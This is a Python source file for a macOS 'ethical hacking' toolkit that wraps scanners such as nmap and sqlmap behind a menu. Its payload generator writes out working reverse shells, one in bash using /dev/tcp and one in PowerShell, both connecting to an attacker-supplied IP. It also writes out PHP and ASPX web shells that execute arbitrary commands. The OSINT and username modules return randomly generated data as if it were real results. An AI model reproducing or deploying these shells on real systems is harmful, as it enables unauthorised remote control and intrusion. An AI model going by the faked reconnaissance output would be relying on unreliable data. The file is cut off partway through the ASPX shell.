#!/usr/bin/env python3

import atexit
import datetime
import ipaddress
import json
import os
import random
import re
import signal
import socket
import subprocess
import sys
import threading
import time
import shlex
import shutil
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

if os.uname().sysname != "Darwin":
    print("This toolkit is designed to run on macOS. Exiting.")
    sys.exit(1)


def install_dependencies():
    required_packages = ["rich", "pyfiglet", "prompt_toolkit", "requests"]
    user = os.environ.get("SUDO_USER", os.environ.get("USER"))
    try:
        if os.geteuid() != 0:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + required_packages)
        else:
            subprocess.check_call(
                ["sudo", "-u", user, sys.executable, "-m", "pip", "install", "--user"] + required_packages)
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        sys.exit(1)


try:
    import requests
    import pyfiglet
    from rich.console import Console
    from rich.text import Text
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn,
        TimeElapsedColumn, TimeRemainingColumn, MofNCompleteColumn
    )
    from rich.live import Live
    from rich.align import Align
    from rich.style import Style
    from rich.markdown import Markdown
    from rich.traceback import install as install_rich_traceback
    from rich.box import ROUNDED

    from prompt_toolkit import prompt as pt_prompt
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.styles import Style as PtStyle
except ImportError:
    install_dependencies()
    os.execv(sys.executable, [sys.executable] + sys.argv)

install_rich_traceback(show_locals=True)
console = Console()

VERSION = "1.1.0"
APP_NAME = "macOS Ethical Hacking Toolkit"
APP_SUBTITLE = "Security Testing & Reconnaissance Suite"
HOSTNAME = socket.gethostname()

BASE_DIR = Path.home() / ".toolkit"
RESULTS_DIR = BASE_DIR / "results"
PAYLOADS_DIR = BASE_DIR / "payloads"
CONFIG_DIR = BASE_DIR / "config"
HISTORY_DIR = BASE_DIR / ".toolkit_history"
DEFAULT_THREADS = 10
DEFAULT_TIMEOUT = 30

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/92.0.4515.107 Safari/537.36",
]

for d in [BASE_DIR, RESULTS_DIR, PAYLOADS_DIR, CONFIG_DIR, HISTORY_DIR]:
    d.mkdir(parents=True, exist_ok=True)

COMMAND_HISTORY = os.path.join(HISTORY_DIR, "command_history")
TARGET_HISTORY = os.path.join(HISTORY_DIR, "target_history")
for history_file in [COMMAND_HISTORY, TARGET_HISTORY]:
    if not os.path.exists(history_file):
        with open(history_file, "w") as f:
            pass


class NordColors:
    POLAR_NIGHT_1 = "#2E3440"
    POLAR_NIGHT_2 = "#3B4252"
    POLAR_NIGHT_3 = "#434C5E"
    POLAR_NIGHT_4 = "#4C566A"
    SNOW_STORM_1 = "#D8DEE9"
    SNOW_STORM_2 = "#E5E9F0"
    SNOW_STORM_3 = "#ECEFF4"
    FROST_1 = "#8FBCBB"
    FROST_2 = "#88C0D0"
    FROST_3 = "#81A1C1"
    FROST_4 = "#5E81AC"
    RED = "#BF616A"
    ORANGE = "#D08770"
    YELLOW = "#EBCB8B"
    GREEN = "#A3BE8C"
    PURPLE = "#B48EAD"

    SUCCESS = Style(color=GREEN, bold=True)
    ERROR = Style(color=RED, bold=True)
    WARNING = Style(color=YELLOW, bold=True)
    INFO = Style(color=FROST_2, bold=True)
    HEADER = Style(color=FROST_1, bold=True)
    SUBHEADER = Style(color=FROST_3, bold=True)
    ACCENT = Style(color=FROST_4, bold=True)
    NORD_BOX = ROUNDED

    @classmethod
    def get_frost_gradient(cls, steps=4):
        return [cls.FROST_1, cls.FROST_2, cls.FROST_3, cls.FROST_4][:steps]

    @classmethod
    def get_polar_gradient(cls, steps=4):
        return [cls.POLAR_NIGHT_1, cls.POLAR_NIGHT_2, cls.POLAR_NIGHT_3, cls.POLAR_NIGHT_4][:steps]

    @classmethod
    def get_progress_columns(cls):
        return [
            SpinnerColumn(spinner_name="dots", style=f"bold {cls.FROST_1}"),
            TextColumn(f"[bold {cls.FROST_2}]{{task.description}}[/]"),
            BarColumn(bar_width=None, style=cls.POLAR_NIGHT_3, complete_style=cls.FROST_2, finished_style=cls.GREEN),
            TaskProgressColumn(style=cls.SNOW_STORM_1),
            MofNCompleteColumn(),
            TimeRemainingColumn(compact=True),
        ]


SECURITY_TOOLS = {
    "Network Analysis": [
        "wireshark", "nmap", "tcpdump", "netcat", "iftop", "ettercap",
        "termshark", "masscan", "arp-scan", "darkstat"
    ],
    "Vulnerability Assessment": ["nikto", "sqlmap", "gobuster", "whatweb"],
    "Forensics": ["sleuthkit", "testdisk", "foremost", "photorec"],
    "System Hardening": ["lynis", "rkhunter", "chkrootkit", "aide", "clamav"],
    "Password & Crypto": ["john", "hashcat", "hydra", "medusa", "gnupg", "ccrypt"],
    "Wireless Security": ["aircrack-ng", "reaver", "pixiewps"],
    "Development Tools": ["git", "gdb", "cmake", "meson", "python3", "radare2", "binwalk"],
    "Container Security": ["docker", "docker-compose", "podman"],
    "Malware Analysis": ["clamav", "yara", "ssdeep", "radare2"],
    "Privacy & Anonymity": ["tor", "torbrowser-launcher", "openvpn", "wireguard-tools"],
}


@dataclass
class ScanResult:
    target: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)
    port_data: Dict[int, Dict[str, str]] = field(default_factory=dict)
    os_info: Optional[str] = None


@dataclass
class OSINTResult:
    target: str
    source_type: str
    data: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class UsernameResult:
    username: str
    platforms: Dict[str, bool]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class ServiceResult:
    service_name: str
    version: Optional[str]
    host: str
    port: int
    details: Dict[str, Any]
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


@dataclass
class Payload:
    name: str
    payload_type: str
    target_platform: str
    content: str
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)


def create_header() -> Panel:
    term_width = shutil.get_terminal_size().columns
    adjusted_width = min(term_width - 4, 80)

    fonts = ["slant", "small_slant", "standard", "big", "digital", "small"]
    ascii_art = ""

    for font in fonts:
        try:
            fig = pyfiglet.Figlet(font=font, width=adjusted_width)
            ascii_art = fig.renderText(APP_NAME)
            if ascii_art.strip():
                break
        except Exception:
            continue

    ascii_lines = [line for line in ascii_art.splitlines() if line.strip()]
    frost_colors = NordColors.get_frost_gradient(min(len(ascii_lines), 4))

    styled_text = ""
    for i, line in enumerate(ascii_lines):
        color = frost_colors[i % len(frost_colors)]
        escaped_line = line.replace("[", "\\[").replace("]", "\\]")
        styled_text += f"[bold {color}]{escaped_line}[/]\n"

    border_style = NordColors.FROST_3
    border_char = "═"
    border_line = f"[{border_style}]{border_char * (adjusted_width - 8)}[/]"

    styled_text = border_line + "\n" + styled_text + border_line

    return Panel(
        Text.from_markup(styled_text),
        border_style=NordColors.FROST_1,
        box=NordColors.NORD_BOX,
        padding=(1, 2),
        title=f"[bold {NordColors.SNOW_STORM_3}]v{VERSION}[/]",
        title_align="right",
        subtitle=f"[bold {NordColors.SNOW_STORM_1}]{APP_SUBTITLE}[/]",
        subtitle_align="center",
    )


def print_message(text: str, style=NordColors.INFO, prefix="•"):
    if isinstance(style, str):
        console.print(f"[{style}]{prefix} {text}[/{style}]")
    else:
        console.print(f"{prefix} {text}", style=style)


def print_success(message: str):
    print_message(message, NordColors.SUCCESS, "✓")


def print_warning(message: str):
    print_message(message, NordColors.WARNING, "⚠")


def print_error(message: str):
    print_message(message, NordColors.ERROR, "✗")


def print_info(message: str):
    print_message(message, NordColors.INFO, "ℹ")


def display_panel(message: str, style=NordColors.INFO, title=None):
    if isinstance(style, str):
        panel = Panel(
            Text.from_markup(message),
            title=title,
            border_style=style,
            box=NordColors.NORD_BOX,
            padding=(1, 2)
        )
    else:
        panel = Panel(
            Text(message),
            title=title,
            border_style=style,
            box=NordColors.NORD_BOX,
            padding=(1, 2)
        )
    console.print(panel)


def get_user_input(prompt_text: str, password: bool = False) -> str:
    try:
        return pt_prompt(
            f"[bold {NordColors.FROST_2}]{prompt_text}:[/] ",
            is_password=password,
            history=FileHistory(COMMAND_HISTORY) if not password else None,
            auto_suggest=AutoSuggestFromHistory() if not password else None,
            style=PtStyle.from_dict({"prompt": f"bold {NordColors.FROST_2}"}),
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return ""


def get_confirmation(prompt_text: str) -> bool:
    try:
        return Confirm.ask(f"[bold {NordColors.FROST_2}]{prompt_text}[/]")
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Confirmation cancelled by user[/]")
        return False


def get_integer_input(prompt_text: str, min_value: int = None, max_value: int = None) -> int:
    try:
        return IntPrompt.ask(
            f"[bold {NordColors.FROST_2}]{prompt_text}[/]",
            min_value=min_value,
            max_value=max_value,
        )
    except (KeyboardInterrupt, EOFError):
        console.print(f"\n[{NordColors.RED}]Input cancelled by user[/]")
        return -1


def create_menu_table(title, options):
    table = Table(
        show_header=True,
        header_style=NordColors.HEADER,
        box=ROUNDED,
        title=title,
        border_style=NordColors.FROST_3,
        padding=(0, 1),
        expand=True,
    )

    table.add_column("#", style=NordColors.ACCENT, width=3, justify="right")
    table.add_column("Option", style=NordColors.FROST_1)
    table.add_column("Description", style=NordColors.SNOW_STORM_1)

    for opt in options:
        table.add_row(*opt)

    return table


def display_progress(total: int, description: str, color: str = NordColors.FROST_2) -> Tuple[Progress, int]:
    progress = Progress(
        SpinnerColumn(spinner_name="dots", style=f"bold {color}"),
        TextColumn(f"[bold {color}]{{task.description}}"),
        BarColumn(bar_width=40, style=NordColors.FROST_4, complete_style=color),
        TaskProgressColumn(style=NordColors.SNOW_STORM_1),
        TimeRemainingColumn(),
        console=console,
    )
    progress.start()
    task = progress.add_task(description, total=total)
    return progress, task


def save_result_to_file(result: Any, filename: str) -> bool:
    try:
        filepath = RESULTS_DIR / filename
        if isinstance(result, ScanResult):
            result_dict = {
                "target": result.target,
                "timestamp": result.timestamp.isoformat(),
                "port_data": result.port_data,
                "os_info": result.os_info,
            }
        elif isinstance(result, OSINTResult):
            result_dict = {
                "target": result.target,
                "source_type": result.source_type,
                "data": result.data,
                "timestamp": result.timestamp.isoformat(),
            }
        elif isinstance(result, UsernameResult):
            result_dict = {
                "username": result.username,
                "platforms": result.platforms,
                "timestamp": result.timestamp.isoformat(),
            }
        elif isinstance(result, ServiceResult):
            result_dict = {
                "service_name": result.service_name,
                "version": result.version,
                "host": result.host,
                "port": result.port,
                "details": result.details,
                "timestamp": result.timestamp.isoformat(),
            }
        else:
            result_dict = result.__dict__ if hasattr(result, '__dict__') else result
        with open(filepath, "w") as f:
            json.dump(result_dict, f, indent=2)
        print_success(f"Results saved to: {filepath}")
        return True
    except Exception as e:
        print_error(f"Failed to save results: {e}")
        return False


def run_command(
        cmd: List[str],
        env=None,
        check=True,
        capture_output=True,
        timeout=DEFAULT_TIMEOUT
) -> subprocess.CompletedProcess:
    cmd_str = " ".join(cmd)
    print_info(f"Executing: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            env=env or os.environ.copy(),
            check=check,
            text=True,
            capture_output=capture_output,
            timeout=timeout,
        )
        return result
    except subprocess.CalledProcessError as e:
        print_error(f"Command failed: {cmd_str}")
        raise
    except subprocess.TimeoutExpired:
        print_error(f"Command timed out after {timeout} seconds: {cmd_str}")
        raise
    except Exception as e:
        print_error(f"Error executing command: {cmd_str} - {e}")
        raise


def get_tool_status(tool_list=None):
    if tool_list is None:
        tool_list = []
        for category, tools in SECURITY_TOOLS.items():
            tool_list.extend(tools)

    installed_tools = {}
    for tool in tool_list:
        installed = shutil.which(tool) is not None
        installed_tools[tool] = installed

    return installed_tools


def network_scanning_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Discover active hosts, open ports and services.",
        NordColors.FROST_1,
        "Network Scanning"
    )

    options = [
        ("1", "Ping Sweep", "Discover live hosts on a network"),
        ("2", "Port Scan", "Identify open ports on a target"),
        ("3", "Run Nmap", "Full-featured network scanner"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Network Scanning Options", options))

    choice = get_integer_input("Select an option", 0, 3)
    if choice == 0:
        return
    elif choice == 1:
        ping_sweep()
    elif choice == 2:
        port_scan()
    elif choice == 3:
        run_nmap()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def ping_sweep():
    target = get_user_input("Enter target subnet (e.g., 192.168.1.0/24)")
    if not target:
        return

    live_hosts = []
    try:
        network = ipaddress.ip_network(target, strict=False)
        hosts = list(network.hosts())
        hosts = hosts[:min(len(hosts), 100)]  # Limit to 100 hosts for performance

        progress, task = display_progress(len(hosts), "Pinging hosts", NordColors.FROST_1)

        with progress:
            def check_host(ip):
                try:
                    if sys.platform == "darwin":
                        cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
                    else:
                        cmd = ["ping", "-c", "1", "-W", "1", str(ip)]

                    if subprocess.run(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=1,
                    ).returncode == 0:
                        live_hosts.append(str(ip))
                finally:
                    progress.update(task, advance=1)

            with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
                executor.map(check_host, hosts)

        if live_hosts:
            display_panel(
                f"Found {len(live_hosts)} active hosts",
                NordColors.GREEN,
                "Scan Complete"
            )

            host_table = Table(
                title="Active Hosts",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            host_table.add_column("IP Address", style=f"bold {NordColors.FROST_2}")
            host_table.add_column("Status", style=NordColors.GREEN)

            for ip in live_hosts:
                host_table.add_row(ip, "● ACTIVE")

            console.print(host_table)

            if get_confirmation("Save these results to file?"):
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"pingsweep_{target.replace('/', '_')}_{timestamp}.json"
                save_result_to_file(
                    {"subnet": target, "live_hosts": live_hosts}, filename
                )
        else:
            display_panel("No active hosts found.", NordColors.RED, "Scan Complete")
    except Exception as e:
        print_error(f"Ping scan error: {e}")


def port_scan():
    target = get_user_input("Enter target IP")
    if not target:
        return

    port_range = get_user_input("Enter port range (e.g., 1-1000) or leave blank for common ports")
    open_ports = {}

    if port_range:
        try:
            start, end = map(int, port_range.split("-"))
            ports = range(start, end + 1)
        except ValueError:
            print_error("Invalid port range. Using common ports.")
            ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080]
    else:
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5900, 8080]

    progress, task = display_progress(len(ports), "Scanning ports", NordColors.FROST_1)

    with progress:
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports[port] = {"service": service, "state": "open"}
                s.close()
            except Exception:
                pass
            finally:
                progress.update(task, advance=1)

    if open_ports:
        display_panel(
            f"Found {len(open_ports)} open ports on {target}",
            NordColors.GREEN,
            "Scan Complete"
        )

        port_table = Table(
            title="Open Ports",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
        port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
        port_table.add_column("State", style=NordColors.GREEN)

        for port, info in sorted(open_ports.items()):
            port_table.add_row(
                str(port), info.get("service", "unknown"), info.get("state", "unknown")
            )

        console.print(port_table)

        if get_confirmation("Save these results to file?"):
            scan_result = ScanResult(target=target, port_data=open_ports)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"portscan_{target.replace('.', '_')}_{timestamp}.json"
            save_result_to_file(scan_result, filename)
    else:
        display_panel(f"No open ports found on {target}", NordColors.YELLOW, "Scan Complete")


def run_nmap():
    if shutil.which("nmap") is None:
        display_panel(
            "Nmap is not installed. Please install it using:\nbrew install nmap",
            NordColors.RED,
            "Tool Missing"
        )
        return

    target = get_user_input("Enter target IP or hostname")
    if not target:
        return

    options = get_user_input("Enter nmap options (e.g., -sS -sV -O) or leave blank for default")

    if not options:
        options = "-sS -sV"

    cmd = ["nmap"] + options.split() + [target]

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running nmap scan...[/]"):
            result = run_command(cmd, capture_output=True, timeout=300)

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"nmap_{target.replace('.', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            display_panel(
                result.stdout,
                NordColors.FROST_2,
                "Nmap Scan Results"
            )
            print_success(f"Results saved to: {output_path}")
        else:
            display_panel("No output from nmap scan", NordColors.YELLOW, "Scan Complete")
    except Exception as e:
        print_error(f"Nmap scan error: {e}")


def osint_gathering_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Collect publicly available intelligence on targets.",
        NordColors.FROST_2,
        "OSINT Gathering"
    )

    domain = get_user_input("Enter target domain (e.g., example.com)")
    if not domain:
        return

    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {domain}..."):
        time.sleep(1.5)  # Simulated processing time
        result = gather_domain_info(domain)

    display_osint_result(result)

    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"osint_domain_{domain.replace('.', '_')}_{timestamp}.json"
        save_result_to_file(result, filename)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def gather_domain_info(domain: str) -> OSINTResult:
    data = {}
    try:
        # Simulated WHOIS data
        data["whois"] = {
            "registrar": "Example Registrar, Inc.",
            "creation_date": f"{random.randint(1995, 2020)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "expiration_date": f"{random.randint(2023, 2030)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "status": random.choice(["clientTransferProhibited", "clientDeleteProhibited"]),
            "name_servers": [f"ns{i}.cloudflare.com" for i in range(1, 3)],
        }

        # Simulated DNS data
        data["dns"] = {
            "a_records": [f"192.0.2.{random.randint(1, 255)}" for _ in range(random.randint(1, 3))],
            "mx_records": [f"mail{i}.{domain}" for i in range(1, random.randint(2, 4))],
            "txt_records": [f"v=spf1 include:_spf.{domain} ~all"],
            "ns_records": data["whois"]["name_servers"],
        }

        # Simulated SSL data
        data["ssl"] = {
            "issuer": random.choice(["Let's Encrypt Authority X3", "DigiCert Inc", "Sectigo Limited"]),
            "valid_from": f"{random.randint(2021, 2022)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "valid_to": f"{random.randint(2023, 2024)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            "serial_number": str(random.randint(1000000000, 9999999999)),
        }

        # Simulated subdomains
        data["subdomains"] = [f"www.{domain}", f"mail.{domain}", f"api.{domain}"]
    except Exception as e:
        print_error(f"Error gathering domain info: {e}")

    return OSINTResult(target=domain, source_type="domain_analysis", data=data)


def display_osint_result(result: OSINTResult):
    console.print()
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Target:[/] {result.target}\n"
            f"[bold {NordColors.FROST_2}]Analysis Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Domain Intelligence Report",
        border_style=NordColors.FROST_1,
    )
    console.print(panel)

    whois = result.data.get("whois", {})
    if whois:
        table = Table(title="WHOIS Information", show_header=True, header_style=f"bold {NordColors.FROST_1}")
        table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in whois.items():
            if key == "name_servers":
                value = ", ".join(value)
            table.add_row(key.replace("_", " ").title(), str(value))

        console.print(table)

    dns = result.data.get("dns", {})
    if dns:
        table = Table(title="DNS Records", show_header=True, header_style=f"bold {NordColors.FROST_1}")
        table.add_column("Record Type", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for rtype, values in dns.items():
            table.add_row(
                rtype.upper(),
                "\n".join(values) if isinstance(values, list) else str(values),
            )

        console.print(table)

    ssl = result.data.get("ssl", {})
    if ssl:
        table = Table(title="SSL Certificate", show_header=True, header_style=f"bold {NordColors.FROST_1}")
        table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in ssl.items():
            table.add_row(key.replace("_", " ").title(), str(value))

        console.print(table)

    subs = result.data.get("subdomains", [])
    if subs:
        table = Table(title="Subdomains", show_header=True, header_style=f"bold {NordColors.FROST_1}")
        table.add_column("Subdomain", style=f"bold {NordColors.FROST_2}")

        for sub in subs:
            table.add_row(sub)

        console.print(table)

    console.print()


def username_enumeration_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Search for a username across multiple platforms.",
        NordColors.FROST_3,
        "Username Enumeration"
    )

    username = get_user_input("Enter username to check")
    if not username:
        return

    result = check_username(username)
    display_username_results(result)

    if get_confirmation("Save these results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"username_{username}_{timestamp}.json"
        save_result_to_file(result, filename)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def check_username(username: str) -> UsernameResult:
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
    }

    results = {}
    progress, task = display_progress(len(platforms), "Checking platforms", NordColors.FROST_3)

    with progress:
        for platform, url in platforms.items():
            time.sleep(0.3)  # Simulated network delay
            # For demonstration purposes: shorter usernames are more likely to be taken
            likelihood = 0.7 if len(username) < 6 else 0.4
            results[platform] = random.random() < likelihood
            progress.update(task, advance=1)

    return UsernameResult(username=username, platforms=results)


def display_username_results(result: UsernameResult):
    console.print()
    panel = Panel(
        Text.from_markup(
            f"[bold {NordColors.FROST_2}]Username:[/] {result.username}\n"
            f"[bold {NordColors.FROST_2}]Time:[/] {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        title="Username Enumeration Results",
        border_style=NordColors.FROST_3,
    )
    console.print(panel)

    table = Table(title="Platform Results", show_header=True, header_style=f"bold {NordColors.FROST_1}")
    table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
    table.add_column("Status", style=NordColors.SNOW_STORM_1)
    table.add_column("URL", style=NordColors.FROST_3)

    found_count = 0
    for platform, found in result.platforms.items():
        if found:
            found_count += 1
            status = f"[bold {NordColors.GREEN}]● FOUND[/]"
            url = f"https://{platform.lower()}.com/{result.username}"
        else:
            status = f"[dim {NordColors.RED}]○ NOT FOUND[/]"
            url = "N/A"

        table.add_row(platform, status, url)

    console.print(table)

    if found_count > 0:
        console.print(f"[bold {NordColors.GREEN}]Username found on {found_count} platforms.[/]")
    else:
        console.print(f"[bold {NordColors.RED}]Username not found on any platforms.[/]")

    console.print()


def vulnerability_scanning_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Scan for vulnerabilities on target systems.",
        NordColors.FROST_2,
        "Vulnerability Scanning"
    )

    options = [
        ("1", "Web Scan (Nikto)", "Scan web server for vulnerabilities"),
        ("2", "SQL Injection Test (sqlmap)", "Test for SQL injection vulnerabilities"),
        ("3", "Directory Bruteforce (gobuster)", "Discover directories and files"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Vulnerability Scanning Options", options))

    choice = get_integer_input("Select an option", 0, 3)
    if choice == 0:
        return

    tools = {
        1: {"name": "nikto", "cmd": ["nikto", "-h"]},
        2: {"name": "sqlmap", "cmd": ["sqlmap", "-u"]},
        3: {"name": "gobuster", "cmd": ["gobuster", "dir", "-u"]},
    }

    tool = tools.get(choice)
    if not tool:
        return

    if shutil.which(tool["name"]) is None:
        display_panel(
            f"{tool['name']} is not installed. Please install it using:\nbrew install {tool['name']}",
            NordColors.RED,
            "Tool Missing"
        )
        return

    target = get_user_input("Enter target URL")
    if not target:
        return

    options = get_user_input(f"Enter additional {tool['name']} options or leave blank for default")

    cmd = tool["cmd"] + [target]
    if options:
        cmd.extend(options.split())

    try:
        with console.status(f"[bold {NordColors.FROST_2}]Running {tool['name']} scan...[/]"):
            result = run_command(cmd, capture_output=True, timeout=600)

        if result.stdout:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{tool['name']}_{target.replace('://', '_').replace('/', '_')}_{timestamp}.txt"
            output_path = RESULTS_DIR / filename

            with open(output_path, "w") as f:
                f.write(result.stdout)

            display_panel(
                result.stdout[:1000] + ("\n...\n[Output truncated]" if len(result.stdout) > 1000 else ""),
                NordColors.FROST_2,
                f"{tool['name'].capitalize()} Scan Results"
            )
            print_success(f"Results saved to: {output_path}")
        else:
            display_panel("No output from scan", NordColors.YELLOW, "Scan Complete")
    except Exception as e:
        print_error(f"Scan error: {e}")

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def payload_generation_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Generate basic payloads for security testing.",
        NordColors.RED,
        "Payload Generation"
    )

    options = [
        ("1", "Reverse Shell", "Generate a reverse shell payload"),
        ("2", "Web Shell", "Generate a web-based shell"),
        ("3", "Password Generator", "Generate strong passwords"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Payload Options", options))

    choice = get_integer_input("Select payload type", 0, 3)
    if choice == 0:
        return

    if choice == 1 or choice == 2:
        payload_types = {1: "shell_reverse", 2: "web"}
        payload_type = payload_types[choice]

        platforms = []
        if payload_type == "shell_reverse":
            platforms = ["linux", "windows"]
        elif payload_type == "web":
            platforms = ["php", "aspx"]

        console.print(f"\n[bold {NordColors.FROST_2}]Available Target Platforms:[/]")
        for i, plat in enumerate(platforms, 1):
            console.print(f"  {i}. {plat.capitalize()}")

        plat_choice = get_integer_input("Select target platform", 1, len(platforms))
        if plat_choice < 1:
            return

        target_platform = platforms[plat_choice - 1]

        if payload_type == "shell_reverse":
            ip = get_user_input("Enter your IP address")
            port = get_integer_input("Enter listening port", 1, 65535)

            with console.status(
                    f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."):
                time.sleep(1)
                payload = generate_payload(payload_type, target_platform, ip, port)
        else:
            with console.status(
                    f"[bold {NordColors.FROST_2}]Generating {payload_type} payload for {target_platform}..."):
                time.sleep(1)
                payload = generate_payload(payload_type, target_platform)

        display_payload(payload)

        if get_confirmation("Save this payload to file?"):
            filepath = save_payload(payload)
            print_success(f"Payload saved to {filepath}")
    elif choice == 3:
        length = get_integer_input("Enter password length", 8, 64)
        if length <= 0:
            return

        complexity = get_integer_input("Enter complexity (1-3, where 3 is most complex)", 1, 3)
        if complexity <= 0:
            return

        num_passwords = get_integer_input("How many passwords to generate?", 1, 20)
        if num_passwords <= 0:
            return

        passwords = generate_passwords(length, complexity, num_passwords)
        display_passwords(passwords)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def generate_payload(payload_type: str, target_platform: str, ip: str = "ATTACKER_IP", port: int = 4444) -> Payload:
    name = f"{payload_type}_{target_platform}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    content = ""

    if payload_type == "shell_reverse":
        if target_platform == "linux":
            content = f"""#!/bin/bash
# Linux Reverse Shell
bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""
        else:  # Windows
            content = f"""# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
"""
    elif payload_type == "web":
        if target_platform == "php":
            content = """<?php
// PHP Web Shell - For educational purposes only
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <button type="submit">Execute</button>
</form>
"""
        else:  # ASPX
            content = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    // ASPX Web Shell - For educational purposes only
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + txtCommand.Text;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string output = stmrdr.ReadToEnd();
            stmrdr.Close();
            txtOutput.Text = output;
        }
        catch (Exception ex)
        {
            txtOutput.Text = "Error: " + ex.Message;
        }
    }
</script>

<html>
<head>
    <title>ASPX Shell</title>
</head>
<body>
